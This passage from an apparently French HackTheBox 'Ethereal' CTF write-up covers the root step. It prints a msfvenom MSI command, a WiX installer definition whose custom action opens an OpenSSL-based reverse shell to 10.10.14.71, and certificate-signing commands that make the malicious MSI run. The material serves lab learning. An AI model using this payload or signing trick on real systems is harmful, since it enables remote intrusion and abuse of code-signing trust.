"c:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\pvk2pfx.exe" -pvk \\VBOXSVR\shared\MyCa.pvk -spc c:\users\ieuser\MyCa.spc -pfx c:\users\ieuser\MyCa.pfx
"c:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\signtool.exe" sign /f c:\users\ieuser\MyCa.pfx c:\users\ieuser\test.msi
```

Voyant que mon MSI était traité (il disparaît du dossier d'*Ethereal* après un moment) sans être exécuté j'ai pensé que ça pouvait être lié au payload car *Windows Defender* tourne sur la machine. A tout hasard j'ai essayé avec un payload peut être moins typé mais plus générique (il suffit d'éditer le bat ciblé pour changer les commandes) .  

```plain
msfvenom -a x86 -f msi --platform windows -p windows/exec CMD="d:\dev\msis\devloop.bat" -o rev.msi
```

Ça ne marche toujours pas... Il faut dire aussi que l'exécution de .bat directement semble tout aussi bloquée :p   

Dans le doute que le problème soit bien du côté de *Defender* il fallait trouver un autre moyen de générer un MSI... On aurait pu penser que c'est une opération simple à faire et qu'il existe des outils *Crosoft* pour faire ça. Mais non !  

J'ai jeté mon dévolu sur [Wix Toolset](http://wixtoolset.org/). C'est pas mal documenté mais pas d'interface graphique.  

Certains ont peut être utilisé un MSI publique et l'ont édité avec *Orca* (je verrais ça quand *Ethereal* sera retiré de *HackTheBox*) mais je tenais à avoir un MSI le plus petit possible.  

Heureusement on peut trouver un template de fichier XML pour *Wix* [sur CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) et après quelques recherches on trouve aussi les options qui nous intéressent.  

On parvient alors à ce fichier XML :  

```html
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
   <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
            Name="Example Product Name" Version="0.0.1" Manufacturer="Example Company Name" Language="1033">
      <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
      <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
      <Directory Id="TARGETDIR" Name="SourceDir">
         <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"/>
      </Directory>
      <Feature Id="DefaultFeature" Level="1">
         <ComponentRef Id="ApplicationFiles"/>
      </Feature>
          <InstallExecuteSequence>
         <Custom Action='OurAction' After='InstallFiles'/>
      </InstallExecuteSequence>
   </Product>
   <Fragment>
                <CustomAction Id="OurAction"
              Directory="TARGETDIR"
              ExeCommand="cmd.exe /c c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.71:73 | cmd | c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.71:136"
              Execute="immediate"
              Return="check" />
   </Fragment>
</Wix>
```

On réutilise le trick d'OpenSSL vu que c'est la seule chose que l'on peut apparemment utiliser sur cette machine :'D   

Il suffit d'utiliser les utilitaires *candle* et *light* comme expliqués dans l'article, on droppe le MSI dans le dossier *dev\msis*... et rien.  

[Ce fut les pires 5 minutes de toute mon histoire !](https://www.youtube.com/watch?v=GOOHTL1vTpg) (Je plaisante, ça a duré bien plus longtemps).  

En fait le certificat et la clé correspondent à une autorité de confiance, il faut donc utiliser les fichiers pour générer une nouvelle clé et utiliser cette dernière pour signer l'exécutable [comme indiqué dans ce thread Stack Overflow](https://stackoverflow.com/questions/84847/how-do-i-create-a-self-signed-certificate-for-code-signing-on-windows).  

Côté commandes ça nous donne quelque chose comme ça :  

```bash
cd c:\users\ieuser\
"c:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\Cert2Spc.exe" c:\users\ieuser\MyCa.cer c:\users\ieuser\MyCa.spc
"c:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\makecert.exe" -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic c:\users\ieuser\MyCA.cer -iv c:\users\ieuser\MyCA.pvk -sv c:\users\ieuser\MySPC.pvk c:\users\ieuser\MySPC.cer
"c:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\pvk2pfx.exe" -pvk c:\users\ieuser\MySPC.pvk -spc c:\users\ieuser\MySPC.cer -pfx c:\users\ieuser\MySPC.pfx
"c:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\signtool.exe" sign /v /n "Me" /s SPC c:\users\ieuser\test.msi
```

Notre MSI est finalement exécuté et on obtient le flag root dans le bureau de l'utilisateur *rupal*.  

Au final
--------

Bobo la tête... Merci à *cslatt05* et *x00byte* pour leur aide précieuse avec ces foutus certificats :D   

Ça fait bizarre de terminer un CTF en n'ayant utilisé que *OpenSSL*. Il y a vraiment des sadiques ! ;-)   

Il me semble que j'avais réussi à exécuter *MSBuild* en tant que *jorge* à un moment mais je n'ai pas approfondi.

*Published March 09 2019 at 17:26*